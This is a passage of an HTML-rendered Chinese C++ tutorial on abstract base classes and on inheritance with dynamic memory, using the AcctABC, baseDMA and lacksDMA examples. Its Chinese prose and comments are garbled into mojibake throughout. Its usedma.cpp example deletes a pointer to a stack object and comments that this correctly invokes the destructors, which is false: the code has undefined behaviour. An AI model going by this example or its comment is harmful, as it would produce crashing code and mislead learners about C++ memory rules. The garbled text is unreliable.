<span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// æ¸…é™¤è¡Œå°¾æ¢è¡Œç¬¦</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨å¤šæ€æ€§å¤„ç†ä¸åŒç±»å‹çš„è´¦æˆ·</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTS; i++) &#123;</span><br><span class="line">        p_clients[i]-&gt;ViewAcct(); <span class="comment">// è°ƒç”¨è™šå‡½æ•° ViewAcct()</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTS; i++) &#123;</span><br><span class="line">        <span class="keyword">delete</span> p_clients[i]; <span class="comment">// è°ƒç”¨è™šææ„å‡½æ•°ï¼Œç¡®ä¿æ­£ç¡®çš„ææ„å‡½æ•°è¢«è°ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## å‡è®¾ acctabc.h ä¸­ balance å·²ç§»è‡³ protected</span></span><br><span class="line">g++ usebrass1.cpp acctabc.cpp -o usebrass1</span><br><span class="line">./usebrass1</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¼šæç¤ºè¾“å…¥å®¢æˆ·ä¿¡æ¯ï¼Œåˆ›å»ºä¸åŒç±»å‹çš„è´¦æˆ·å¯¹è±¡ï¼Œç„¶åé€šè¿‡åŸºç±»æŒ‡é’ˆæ•°ç»„ <code>p_clients</code> å¤šæ€åœ°è°ƒç”¨ <code>ViewAcct()</code> æ–¹æ³•ï¼Œæ˜¾ç¤ºæ¯ä¸ªè´¦æˆ·çš„ä¿¡æ¯ã€‚æœ€åï¼Œé€šè¿‡ <code>delete p_clients[i]</code> å®‰å…¨åœ°é”€æ¯å¯¹è±¡ï¼Œå› ä¸º <code>~AcctABC()</code> æ˜¯è™šææ„å‡½æ•°ã€‚</p><h3 id="13-6-2-ABC-ç†å¿µ"><a href="#13-6-2-ABC-ç†å¿µ" class="headerlink" title="13.6.2 ABC ç†å¿µ"></a>13.6.2 ABC ç†å¿µ</h3><p>æŠ½è±¡åŸºç±»çš„æ ¸å¿ƒç†å¿µæ˜¯<strong>æ¥å£ä¸å®ç°åˆ†ç¦»</strong>ã€‚</p><ul><li>  <strong>æ¥å£:</strong> ABC å®šä¹‰äº†ä¸€ä¸ªé€šç”¨çš„æ¥å£ï¼ˆé€šè¿‡çº¯è™šå‡½æ•°å’Œå¯èƒ½çš„éè™šå‡½æ•°ï¼‰ï¼Œè§„å®šäº†æ´¾ç”Ÿç±»åº”è¯¥å…·æœ‰å“ªäº›åŠŸèƒ½ã€‚</li><li>  <strong>å®ç°:</strong> å…·ä½“çš„æ´¾ç”Ÿç±»è´Ÿè´£æä¾›è¿™äº›åŠŸèƒ½çš„å…·ä½“å®ç°ã€‚</li></ul><p>ä½¿ç”¨ ABC çš„å¥½å¤„ï¼š</p><ol><li> <strong>å¼ºåˆ¶æ¥å£ç»Ÿä¸€:</strong> ç¡®ä¿æ‰€æœ‰ç›¸å…³çš„æ´¾ç”Ÿç±»éƒ½éµå¾ªä¸€ä¸ªå…±åŒçš„æ¥å£è§„èŒƒã€‚</li><li> <strong>å®ç°å¤šæ€:</strong> å…è®¸é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨æ¥ç»Ÿä¸€å¤„ç†ä¸åŒæ´¾ç”Ÿç±»çš„å¯¹è±¡ï¼Œè°ƒç”¨å®ƒä»¬å„è‡ªå®ç°çš„è™šå‡½æ•°ç‰ˆæœ¬ã€‚</li><li> <strong>ä»£ç å¯æ‰©å±•æ€§:</strong> å½“éœ€è¦æ·»åŠ æ–°çš„è´¦æˆ·ç±»å‹ï¼ˆä¾‹å¦‚ <code>SavingsAccount</code>ï¼‰æ—¶ï¼Œåªéœ€ä» <code>AcctABC</code> æ´¾ç”Ÿå¹¶å®ç°å…¶çº¯è™šå‡½æ•°å³å¯ï¼Œç°æœ‰ä½¿ç”¨ <code>AcctABC*</code> çš„ä»£ç ï¼ˆå¦‚ <code>main</code> å‡½æ•°ä¸­çš„å¾ªç¯ï¼‰é€šå¸¸æ— éœ€ä¿®æ”¹å°±èƒ½å¤„ç†æ–°çš„è´¦æˆ·ç±»å‹ã€‚</li><li> <strong>æ¸…æ™°çš„è®¾è®¡:</strong> æ›´å¥½åœ°æ¨¡æ‹Ÿç°å®ä¸–ç•Œä¸­çš„æŠ½è±¡æ¦‚å¿µå’Œå±‚æ¬¡å…³ç³»ã€‚</li></ol><p>ABC æ˜¯ C++ ä¸­å®ç°æŠ½è±¡å’Œå¤šæ€çš„å…³é”®å·¥å…·ï¼Œå¯¹äºè®¾è®¡çµæ´»ã€å¯ç»´æŠ¤çš„é¢å‘å¯¹è±¡ç³»ç»Ÿéå¸¸é‡è¦ã€‚</p><h2 id="13-7-ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜åˆ†é…"><a href="#13-7-ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜åˆ†é…" class="headerlink" title="13.7 ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜åˆ†é…"></a>13.7 ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜åˆ†é…</h2><p>å½“ç»§æ‰¿ä¸åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆä½¿ç”¨ <code>new</code> å’Œ <code>delete</code>ï¼‰ç»“åˆæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ç‰¹åˆ«æ³¨æ„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦çš„è¡Œä¸ºï¼Œä»¥ç¡®ä¿èµ„æºçš„æ­£ç¡®ç®¡ç†ã€‚ä¸»è¦æœ‰ä¸¤ç§æƒ…å†µï¼š</p><h3 id="13-7-1-ç¬¬ä¸€ç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä¸ä½¿ç”¨-new"><a href="#13-7-1-ç¬¬ä¸€ç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä¸ä½¿ç”¨-new" class="headerlink" title="13.7.1 ç¬¬ä¸€ç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä¸ä½¿ç”¨ new"></a>13.7.1 ç¬¬ä¸€ç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä¸ä½¿ç”¨ <code>new</code></h3><p>å¦‚æœåŸºç±»ä½¿ç”¨äº†åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå› æ­¤éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°ã€èµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œè€Œæ´¾ç”Ÿç±»<strong>æ²¡æœ‰</strong>ä½¿ç”¨ <code>new</code> æ¥åˆ†é…è‡ªå·±çš„åŠ¨æ€å†…å­˜ï¼Œæƒ…å†µç›¸å¯¹ç®€å•ã€‚</p><ul><li><p><strong>ææ„å‡½æ•°:</strong></p><ul><li>  æ´¾ç”Ÿç±»ä¸éœ€è¦æ˜¾å¼å®šä¹‰ææ„å‡½æ•°æ¥é‡Šæ”¾å†…å­˜ï¼ˆå› ä¸ºå®ƒæ²¡æœ‰åˆ†é…ï¼‰ã€‚</li><li>  å½“æ´¾ç”Ÿç±»å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œä¼šå…ˆæ‰§è¡Œæ´¾ç”Ÿç±»çš„ææ„å‡½æ•°ï¼ˆå³ä½¿æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬ï¼‰ï¼Œç„¶å<strong>è‡ªåŠ¨</strong>è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ã€‚</li><li>  <strong>å…³é”®:</strong> ä¸ºäº†èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆ <code>delete</code> æ´¾ç”Ÿç±»å¯¹è±¡ï¼ŒåŸºç±»çš„ææ„å‡½æ•°<strong>å¿…é¡»</strong>å£°æ˜ä¸º <code>virtual</code>ã€‚å¦‚æœåŸºç±»ææ„å‡½æ•°æ˜¯è™šå‡½æ•°ï¼Œé‚£ä¹ˆ <code>delete basePtr;</code> (å…¶ä¸­ <code>basePtr</code> æŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡) ä¼šå…ˆè°ƒç”¨æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°ï¼Œå†è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ï¼Œç¡®ä¿æ‰€æœ‰èµ„æºè¢«æ­£ç¡®é‡Šæ”¾ã€‚</li></ul></li><li><p><strong>å¤åˆ¶æ„é€ å‡½æ•°:</strong></p><ul><li>  æ´¾ç”Ÿç±»çš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€å¤åˆ¶ã€‚å¯¹äºç»§æ‰¿è‡ªåŸºç±»çš„éƒ¨åˆ†ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨<strong>åŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•°</strong>ã€‚</li><li>  å› æ­¤ï¼Œå¦‚æœåŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•°æ­£ç¡®å®ç°äº†æ·±å¤åˆ¶ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å¯¹è±¡çš„åŸºç±»éƒ¨åˆ†ä¹Ÿä¼šè¢«æ­£ç¡®åœ°æ·±å¤åˆ¶ã€‚æ´¾ç”Ÿç±»è‡ªèº«çš„æˆå‘˜ï¼ˆéåŠ¨æ€åˆ†é…ï¼‰ä¼šè¢«æ­£å¸¸å¤åˆ¶ã€‚</li></ul></li><li><p><strong>èµ‹å€¼è¿ç®—ç¬¦:</strong></p><ul><li>  æ´¾ç”Ÿç±»çš„é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦ä¼šæ‰§è¡Œæˆå‘˜é€ä¸€èµ‹å€¼ã€‚å¯¹äºç»§æ‰¿è‡ªåŸºç±»çš„éƒ¨åˆ†ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨<strong>åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦</strong>ã€‚</li><li>  å› æ­¤ï¼Œå¦‚æœåŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦æ­£ç¡®å®ç°äº†æ·±å¤åˆ¶ï¼ˆåŒ…æ‹¬å¤„ç†è‡ªæˆ‘èµ‹å€¼å’Œé‡Šæ”¾æ—§å†…å­˜ï¼‰ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å¯¹è±¡çš„åŸºç±»éƒ¨åˆ†ä¹Ÿä¼šè¢«æ­£ç¡®åœ°èµ‹å€¼ã€‚</li></ul></li></ul><p><strong>ç»“è®º:</strong> å¦‚æœåŸºç±»æ­£ç¡®åœ°ç®¡ç†äº†å®ƒçš„åŠ¨æ€å†…å­˜ï¼ˆéµå¾ªä¸‰/äº”æ³•åˆ™ï¼Œç‰¹åˆ«æ˜¯ä½¿ç”¨è™šææ„å‡½æ•°ï¼‰ï¼Œå¹¶ä¸”æ´¾ç”Ÿç±»æ²¡æœ‰å¼•å…¥æ–°çš„åŠ¨æ€å†…å­˜ç®¡ç†éœ€æ±‚ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»é€šå¸¸ä¸éœ€è¦æ˜¾å¼å®šä¹‰è¿™äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ã€‚</p><p><strong>ç¤ºä¾‹ (baseDMA å’Œ lacksDMA):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dma.h -- ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜åˆ†é…</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DMA_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMA_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…çš„åŸºç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baseDMA</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * label;</span><br><span class="line">    <span class="keyword">int</span> rating;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    baseDMA(<span class="keyword">const</span> <span class="keyword">char</span> * l = <span class="string">&quot;null&quot;</span>, <span class="keyword">int</span> r = <span class="number">0</span>);</span><br><span class="line">    baseDMA(<span class="keyword">const</span> baseDMA &amp; rs); <span class="comment">// å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">virtual</span> ~baseDMA(); <span class="comment">// è™šææ„å‡½æ•°</span></span><br><span class="line">    baseDMA &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> baseDMA &amp; rs); <span class="comment">// èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> baseDMA &amp; rs);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ´¾ç”Ÿç±» - ä¸ä½¿ç”¨ new</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lacksDMA</span> :</span> <span class="keyword">public</span> baseDMA &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> COL_LEN = <span class="number">40</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> color[COL_LEN];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c = <span class="string">&quot;blank&quot;</span>, <span class="keyword">const</span> <span class="keyword">char</span> * l = <span class="string">&quot;null&quot;</span>, <span class="keyword">int</span> r = <span class="number">0</span>);</span><br><span class="line">    lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c, <span class="keyword">const</span> baseDMA &amp; rs);</span><br><span class="line">    <span class="comment">// ä¸éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°ã€èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> lacksDMA &amp; ls);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// DMA_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dma.cpp -- å®ç°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;dma.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- baseDMA å®ç° ---</span></span><br><span class="line">baseDMA::baseDMA(<span class="keyword">const</span> <span class="keyword">char</span> * l, <span class="keyword">int</span> r) &#123;</span><br><span class="line">    label = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(l) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(label, l);</span><br><span class="line">    rating = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">baseDMA::baseDMA(<span class="keyword">const</span> baseDMA &amp; rs) &#123; <span class="comment">// æ·±å¤åˆ¶</span></span><br><span class="line">    label = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(rs.label) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(label, rs.label);</span><br><span class="line">    rating = rs.rating;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">baseDMA::~baseDMA() &#123;</span><br><span class="line">    <span class="keyword">delete</span> [] label;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">baseDMA &amp; baseDMA::<span class="keyword">operator</span>=(<span class="keyword">const</span> baseDMA &amp; rs) &#123; <span class="comment">// æ·±å¤åˆ¶èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;rs)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">delete</span> [] label; <span class="comment">// é‡Šæ”¾æ—§å†…å­˜</span></span><br><span class="line">    label = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(rs.label) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(label, rs.label);</span><br><span class="line">    rating = rs.rating;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> baseDMA &amp; rs) &#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Label: &quot;</span> &lt;&lt; rs.label &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Rating: &quot;</span> &lt;&lt; rs.rating &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- lacksDMA å®ç° ---</span></span><br><span class="line">lacksDMA::lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c, <span class="keyword">const</span> <span class="keyword">char</span> * l, <span class="keyword">int</span> r)</span><br><span class="line">    : baseDMA(l, r) &#123; <span class="comment">// è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strncpy</span>(color, c, COL_LEN - <span class="number">1</span>);</span><br><span class="line">    color[COL_LEN - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lacksDMA::lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c, <span class="keyword">const</span> baseDMA &amp; rs)</span><br><span class="line">    : baseDMA(rs) &#123; <span class="comment">// è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strncpy</span>(color, c, COL_LEN - <span class="number">1</span>);</span><br><span class="line">    color[COL_LEN - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> lacksDMA &amp; ls) &#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨åŸºç±»çš„ operator&lt;&lt; (éœ€è¦å‹å…ƒæˆ–ç±»å‹è½¬æ¢ï¼Œæˆ–è€…ç›´æ¥è®¿é—®)</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œå‡è®¾é€šè¿‡ç±»å‹è½¬æ¢æˆ–ç›´æ¥è°ƒç”¨åŸºç±»æ–¹æ³•</span></span><br><span class="line">    os &lt;&lt; (<span class="keyword">const</span> baseDMA &amp;) ls; <span class="comment">// å°†æ´¾ç”Ÿç±»å¼•ç”¨è½¬æ¢ä¸ºåŸºç±»å¼•ç”¨æ¥è°ƒç”¨åŸºç±» operator&lt;&lt;</span></span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Color: &quot;</span> &lt;&lt; ls.color &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// usedma.cpp -- ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;dma.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="function">baseDMA <span class="title">shirt</span><span class="params">(<span class="string">&quot;Portabelly&quot;</span>, <span class="number">8</span>)</span></span>;</span><br><span class="line">    <span class="function">lacksDMA <span class="title">balloon</span><span class="params">(<span class="string">&quot;red&quot;</span>, <span class="string">&quot;Blimpo&quot;</span>, <span class="number">4</span>)</span></span>; <span class="comment">// æ´¾ç”Ÿç±»å¯¹è±¡</span></span><br><span class="line">    <span class="function">lacksDMA <span class="title">balloon2</span><span class="params">(balloon)</span></span>; <span class="comment">// ä½¿ç”¨é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying baseDMA object:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; shirt;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying lacksDMA object:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; balloon;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of lacksDMA copy:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; balloon2;</span><br><span class="line"></span><br><span class="line">    baseDMA * p_dma = &amp;balloon; <span class="comment">// åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Deleting derived object via base pointer:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p_dma; <span class="comment">// æ­£ç¡®è°ƒç”¨ ~lacksDMA() (é»˜è®¤) ç„¶å ~baseDMA() (è™šå‡½æ•°)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-7-2-ç¬¬äºŒç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä½¿ç”¨-new"><a href="#13-7-2-ç¬¬äºŒç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä½¿ç”¨-new" class="headerlink" title="13.7.2 ç¬¬äºŒç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä½¿ç”¨ new"></a>13.7.2 ç¬¬äºŒç§æƒ…å†µï¼šæ´¾ç”Ÿç±»ä½¿ç”¨ <code>new</code></h3><p>å¦‚æœæ´¾ç”Ÿç±»<strong>ä¹Ÿ</strong>ä½¿ç”¨äº† <code>new</code> æ¥åˆ†é…è‡ªå·±çš„åŠ¨æ€å†…å­˜ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»<strong>å¿…é¡»</strong>æä¾›è‡ªå·±çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ã€‚</p><ul><li><p><strong>ææ„å‡½æ•° (<code>~Derived()</code>):</strong></p><ul><li>  å¿…é¡»æ˜¾å¼å®šä¹‰ã€‚</li><li>  è´Ÿè´£ <code>delete</code> æˆ– <code>delete[]</code> <strong>æ´¾ç”Ÿç±»è‡ªå·±åˆ†é…</strong>çš„å†…å­˜ã€‚</li><li>  ä¸éœ€è¦ï¼ˆä¹Ÿä¸èƒ½ï¼‰æ˜¾å¼è°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ï¼›åŸºç±»ææ„å‡½æ•°ä¼šåœ¨æ´¾ç”Ÿç±»ææ„å‡½æ•°æ‰§è¡Œå®Œæ¯•å<strong>è‡ªåŠ¨</strong>è¢«è°ƒç”¨ã€‚</li><li>  åŸºç±»ææ„å‡½æ•°ä»åº”æ˜¯ <code>virtual</code>ã€‚</li></ul></li><li><p><strong>å¤åˆ¶æ„é€ å‡½æ•° (<code>Derived(const Derived &amp;)</code>):</strong></p><ul><li>  å¿…é¡»æ˜¾å¼å®šä¹‰ã€‚</li><li>  åœ¨<strong>æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨</strong>ä¸­ï¼Œå¿…é¡»æ˜¾å¼è°ƒç”¨<strong>åŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•°</strong> <code>Base(other)</code> æ¥å®ŒæˆåŸºç±»éƒ¨åˆ†çš„æ·±å¤åˆ¶ã€‚</li><li>  ç„¶åï¼Œåœ¨æ„é€ å‡½æ•°ä½“ä¸­ï¼Œä¸ºæ´¾ç”Ÿç±»è‡ªå·±ç®¡ç†çš„åŠ¨æ€å†…å­˜æ‰§è¡Œæ·±å¤åˆ¶ï¼ˆåˆ†é…æ–°å†…å­˜ï¼Œå¤åˆ¶æ•°æ®ï¼‰ã€‚</li></ul></li><li><p><strong>èµ‹å€¼è¿ç®—ç¬¦ (<code>Derived &amp; operator=(const Derived &amp;)</code>):</strong></p><ul><li>  å¿…é¡»æ˜¾å¼å®šä¹‰ã€‚</li><li>  <strong>æ£€æŸ¥è‡ªæˆ‘èµ‹å€¼</strong>ã€‚</li><li>  æ˜¾å¼è°ƒç”¨<strong>åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦</strong> <code>Base::operator=(other)</code> æ¥å®ŒæˆåŸºç±»éƒ¨åˆ†çš„æ·±å¤åˆ¶èµ‹å€¼ã€‚</li><li>  